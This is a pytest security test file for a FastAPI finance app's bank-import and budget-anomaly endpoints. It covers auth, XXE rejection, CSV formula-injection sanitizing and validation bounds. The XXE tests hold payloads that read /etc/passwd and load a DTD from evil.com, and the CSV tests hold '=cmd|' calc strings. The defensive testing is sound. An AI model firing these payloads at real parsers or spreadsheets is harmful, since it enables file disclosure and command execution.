"""
Security wiring tests — W14.

Covers:
- Bank import endpoint requires auth → 401 without JWT
- Budget anomalies endpoint requires auth → 401 without JWT
- XML with <!ENTITY → rejected (XXE protection)
- XML with <!DOCTYPE → rejected (XXE protection)
- CSV formula injection (=cmd|) → sanitized in description
- Anomaly detection: income transactions not flagged as spending anomalies
- Input validation: threshold bounds enforced
"""

import random

import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.services.bank_import_service import (
    _sanitize_csv_field,
    parse_iso20022_xml,
    safe_fromstring,
)
from app.services.anomaly_detection_service import AnomalyDetectionService


# ── Fixtures ────────────────────────────────────────────────────────────────


@pytest.fixture
def client_no_auth():
    """Test client WITHOUT auth override — requests are unauthenticated."""
    app.dependency_overrides.clear()
    with TestClient(app) as c:
        yield c
    app.dependency_overrides.clear()


# ── 1. Auth: bank import requires authentication ────────────────────────────


class TestBankImportAuth:
    """Bank import endpoint must require authentication."""

    def test_import_without_auth_returns_401(self, client_no_auth):
        """POST /api/v1/bank-import/import without JWT → 401."""
        import io

        csv_content = b"Buchungsdatum;Beschreibung;Betrag;Saldo\n15.01.2026;Test;-50.00;1000.00\n"
        response = client_no_auth.post(
            "/api/v1/bank-import/import",
            files={"file": ("test.csv", io.BytesIO(csv_content), "text/csv")},
        )
        assert response.status_code == 401

    def test_import_with_auth_accepted(self, client):
        """POST /api/v1/bank-import/import with auth → not 401/403."""
        import io

        csv_content = b"Buchungsdatum;Beschreibung;Betrag;Saldo\n15.01.2026;Migros;-50.00;1000.00\n"
        response = client.post(
            "/api/v1/bank-import/import",
            files={"file": ("test.csv", io.BytesIO(csv_content), "text/csv")},
        )
        assert response.status_code in (200, 400)  # May fail parsing, but not auth


# ── 2. Auth: budget anomalies requires authentication ───────────────────────


class TestBudgetAnomaliesAuth:
    """Budget anomalies endpoint must require authentication."""

    def test_anomalies_without_auth_returns_401(self, client_no_auth):
        """POST /api/v1/budget/anomalies without JWT → 401."""
        response = client_no_auth.post(
            "/api/v1/budget/anomalies",
            json={"transactions": [{"amount": 50.0}]},
        )
        assert response.status_code == 401

    def test_anomalies_with_auth_accepted(self, client):
        """POST /api/v1/budget/anomalies with auth → not 401/403."""
        tx = [{"amount": 50.0, "category": "food"} for _ in range(15)]
        response = client.post(
            "/api/v1/budget/anomalies",
            json={"transactions": tx},
        )
        assert response.status_code == 200


# ── 3. XXE protection on XML parsing ───────────────────────────────────────


class TestXxeProtection:
    """XML with DTD/entity declarations must be rejected."""

    def test_xml_with_entity_rejected(self):
        """XML containing <!ENTITY should be rejected."""
        malicious_xml = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            "<Document>&xxe;</Document>"
        )
        with pytest.raises((ValueError, Exception)):
            safe_fromstring(malicious_xml)

    def test_xml_with_doctype_rejected(self):
        """XML containing <!DOCTYPE should be rejected."""
        malicious_xml = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd">'
            "<Document>test</Document>"
        )
        with pytest.raises((ValueError, Exception)):
            safe_fromstring(malicious_xml)

    def test_clean_xml_accepted(self):
        """Normal XML without DTD should parse fine."""
        clean_xml = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Document xmlns="urn:iso:std:iso:20022:tech:xsd:camt.053.001.04">'
            "<BkToCstmrStmt><GrpHdr><MsgId>OK</MsgId></GrpHdr></BkToCstmrStmt>"
            "</Document>"
        )
        root = safe_fromstring(clean_xml)
        assert root is not None

    def test_xxe_via_parse_iso20022_xml(self):
        """XXE attempt via the high-level XML parser returns warnings, no crash."""
        malicious_xml = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<Document xmlns="urn:iso:std:iso:20022:tech:xsd:camt.053.001.04">'
            "<BkToCstmrStmt></BkToCstmrStmt></Document>"
        )
        result = parse_iso20022_xml(malicious_xml)
        # Should either reject or return error/warning — NOT succeed with entity expansion
        assert len(result.transactions) == 0
        assert len(result.warnings) > 0 or result.confidence == 0.0


# ── 4. Formula injection sanitization ──────────────────────────────────────


class TestFormulaInjection:
    """CSV fields with formula-like prefixes must be sanitized."""

    def test_equals_prefix_sanitized(self):
        assert _sanitize_csv_field("=cmd|' /C calc'!A0") == "'=cmd|' /C calc'!A0"

    def test_plus_prefix_sanitized(self):
        assert _sanitize_csv_field("+cmd|' /C calc'!A0") == "'+cmd|' /C calc'!A0"

    def test_minus_prefix_sanitized(self):
        assert _sanitize_csv_field("-cmd|' /C calc'!A0") == "'-cmd|' /C calc'!A0"

    def test_at_prefix_sanitized(self):
        assert _sanitize_csv_field("@SUM(A1:A10)") == "'@SUM(A1:A10)"

    def test_tab_prefix_sanitized(self):
        assert _sanitize_csv_field("\t=cmd") == "'\t=cmd"

    def test_cr_prefix_sanitized(self):
        assert _sanitize_csv_field("\r=cmd") == "'\r=cmd"

    def test_normal_text_unchanged(self):
        assert _sanitize_csv_field("Migros Sion Centre") == "Migros Sion Centre"

    def test_empty_string_unchanged(self):
        assert _sanitize_csv_field("") == ""

    def test_numeric_string_unchanged(self):
        assert _sanitize_csv_field("12345.67") == "12345.67"


# ── 5. Income/expense separation in anomaly detection ──────────────────────


class TestAnomalyIncomeExpenseSeparation:
    """Anomaly detection should focus on expenses, not flag incomes."""

    def test_income_not_flagged_as_spending_anomaly(self):
        """Large income (salary) should NOT trigger a spending anomaly."""
        rng = random.Random(42)
        # 80 small expenses
        expenses = [
            {"amount": -round(rng.gauss(50, 10), 2), "category": "food"}
            for _ in range(80)
        ]
        # 10 regular salaries (large positive amounts)
        incomes = [
            {"amount": 5200.0, "category": "salary"}
            for _ in range(10)
        ]
        # 1 unusually large expense
        big_expense = [{"amount": -800.0, "category": "food"}]

        all_tx = expenses + incomes + big_expense
        result = AnomalyDetectionService.detect_spending_anomalies(all_tx)

        # Salary should not appear in anomalies
        salary_anomalies = [
            r for r in result
            if r.get("category") == "salary" and r["anomaly_type"] == "global"
        ]
        assert len(salary_anomalies) == 0, (
            "Salary (income) should not be flagged as a global spending anomaly"
        )

    def test_large_expense_still_detected(self):
        """Large expenses should still be flagged even with income present."""
        rng = random.Random(42)
        expenses = [
            {"amount": -round(rng.gauss(50, 5), 2), "category": "food"}
            for _ in range(80)
        ]
        incomes = [
            {"amount": 5200.0, "category": "salary"}
            for _ in range(10)
        ]
        big_expense = [{"amount": -800.0, "category": "food"}]

        all_tx = expenses + incomes + big_expense
        result = AnomalyDetectionService.detect_spending_anomalies(all_tx)

        # The -800 expense should be flagged
        flagged_amounts = [abs(r["amount"]) for r in result]
        assert 800.0 in flagged_amounts, (
            "Large expense should still be detected as anomaly"
        )


# ── 6. Input validation bounds ─────────────────────────────────────────────


class TestInputValidation:
    """Schema validation bounds are enforced."""

    def test_threshold_too_low_rejected(self, client):
        """mad_threshold below 0.1 → 422 validation error."""
        response = client.post(
            "/api/v1/budget/anomalies",
            json={
                "transactions": [{"amount": 50.0} for _ in range(15)],
                "madThreshold": 0.05,
            },
        )
        assert response.status_code == 422

    def test_threshold_too_high_rejected(self, client):
        """mad_threshold above 10 → 422 validation error."""
        response = client.post(
            "/api/v1/budget/anomalies",
            json={
                "transactions": [{"amount": 50.0} for _ in range(15)],
                "madThreshold": 15.0,
            },
        )
        assert response.status_code == 422

    def test_zscore_threshold_bounds(self, client):
        """zscoreThreshold outside (0.1, 10) → 422."""
        response = client.post(
            "/api/v1/budget/anomalies",
            json={
                "transactions": [{"amount": 50.0} for _ in range(15)],
                "zscoreThreshold": 0.0,
            },
        )
        assert response.status_code == 422

    def test_transactions_list_too_long_rejected(self, client):
        """More than 5000 transactions → 422 validation error."""
        tx = [{"amount": 50.0} for _ in range(5001)]
        response = client.post(
            "/api/v1/budget/anomalies",
            json={"transactions": tx},
        )
        assert response.status_code == 422
